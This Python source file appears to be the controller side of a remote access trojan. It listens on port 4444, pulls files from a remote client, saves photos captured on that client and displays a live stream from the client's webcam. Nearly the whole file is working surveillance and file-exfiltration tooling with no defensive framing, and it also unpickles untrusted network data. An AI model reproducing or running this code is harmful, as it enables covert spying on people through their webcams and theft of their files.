import random
import string
import os
import cv2
import pickle
import struct
import socket
import logging
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

CONFIG = {
    'buffer_size': 4096,
    'webcam_host': "0.0.0.0",
    'webcam_port': 4444
}


def generate_random_filename(extension: str = ".jpg", length: int = 10) -> str:
    """Generate random filename."""
    random_str = ''.join(random.choices(string.ascii_lowercase, k=length))
    return f"{random_str}{extension}"


def download(filename: str, conn: socket.socket, save_path: Optional[str] = None):
    """Download file from client."""
    try:
        if save_path is None:
            save_path = Path.cwd() / filename
        else:
            save_path = Path(save_path)
        
        # Create directory if it doesn't exist
        save_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(save_path, 'wb') as file:
            while True:
                chunk = conn.recv(CONFIG['buffer_size'])
                if not chunk or b"DONE" in chunk:
                    # Write everything except the DONE marker
                    if chunk:
                        file.write(chunk.replace(b"DONE", b""))
                    break
                file.write(chunk)
        
        logger.info(f"File saved to: {save_path}")
        print(f"[+] File saved to: {save_path}")
        
    except Exception as e:
        logger.error(f"Download error: {e}")
        print(f"[-] Download failed: {e}")


def photo_capture(conn: socket.socket, save_dir: Optional[str] = None):
    """Capture and save photo from client."""
    try:
        filename = generate_random_filename(".jpg")
        
        if save_dir:
            filepath = Path(save_dir) / filename
            filepath.parent.mkdir(parents=True, exist_ok=True)
        else:
            filepath = Path.cwd() / filename
        
        with open(filepath, 'wb') as file:
            while True:
                chunk = conn.recv(CONFIG['buffer_size'])
                if not chunk or b"DONE" in chunk:
                    if chunk:
                        file.write(chunk.replace(b"DONE", b""))
                    break
                file.write(chunk)
        
        logger.info(f"Photo saved to: {filepath}")
        print(f"[+] Photo saved to: {filepath}")
        
    except Exception as e:
        logger.error(f"Photo capture error: {e}")
        print(f"[-] Photo capture failed: {e}")


def webcam_stream(host: str = CONFIG['webcam_host'], port: int = CONFIG['webcam_port']):
    """Receive and display webcam stream from client."""
    server_socket = None
    connection = None
    
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(1)
        
        print("[+] Waiting for webcam stream...")
        connection, address = server_socket.accept()
        print(f"[+] Stream connected from {address[0]}")
        
        data = b""
        payload_size = struct.calcsize(">L")
        
        while True:
            # Receive frame size
            while len(data) < payload_size:
                packet = connection.recv(CONFIG['buffer_size'])
                if not packet:
                    break
                data += packet
            
            if len(data) < payload_size:
                break
            
            # Send acknowledgment
            connection.sendall(b".")
            
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            
            # Receive frame data
            while len(data) < msg_size:
                packet = connection.recv(CONFIG['buffer_size'])
                if not packet:
                    break
                data += packet
            
            frame_data = data[:msg_size]
            data = data[msg_size:]
            
            # Decode and display frame
            try:
                frame = pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                
                if frame is not None:
                    cv2.imshow("Webcam Stream (Press 'q' to quit)", frame)
                    
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        connection.sendall(b"DONE")
                        break
            except Exception as e:
                logger.error(f"Frame decode error: {e}")
                continue
        
    except Exception as e:
        logger.error(f"Webcam stream error: {e}")
        print(f"[-] Webcam stream failed: {e}")
    finally:
        cv2.destroyAllWindows()
        if connection:
            connection.close()
        if server_socket:
            server_socket.close()
        print("[+] Webcam stream stopped")


# Backward compatibility
webcam = webcam_stream
